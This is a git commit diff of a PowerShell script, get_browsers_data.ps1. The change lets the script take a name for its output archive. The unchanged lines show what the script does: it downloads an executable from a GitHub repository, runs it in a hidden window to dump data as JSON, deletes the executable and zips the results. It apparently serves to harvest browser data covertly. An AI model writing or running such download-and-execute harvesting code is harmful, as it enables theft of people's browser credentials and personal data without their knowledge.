215534a8cd019ce1d9580f9dfec221ca6f95dad5
jfkd02ks <115693098+jfkd02ks@users.noreply.github.com>
2022-10-16 09:18:20 +0300

    Update get_browsers_data.ps1

--- get_browsers_data.ps1
+++ get_browsers_data.ps1
@@ -1,5 +1,10 @@
+param (
+    [Parameter()]
+    [String]$dump_file_name
+)
+
 Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b32.exe' -OutFile "b32.exe"
 Start-Process -FilePath b32.exe -ArgumentList "--format json" -Wait -WindowStyle Hidden
 Remove-Item -Path "$env:appdata\Microsoft\dump\b32.exe" -Force
-Compress-Archive -Path * -DestinationPath dump.zip
+Compress-Archive -Path * -DestinationPath "$dump_file_name"
 $Random = Get-Random
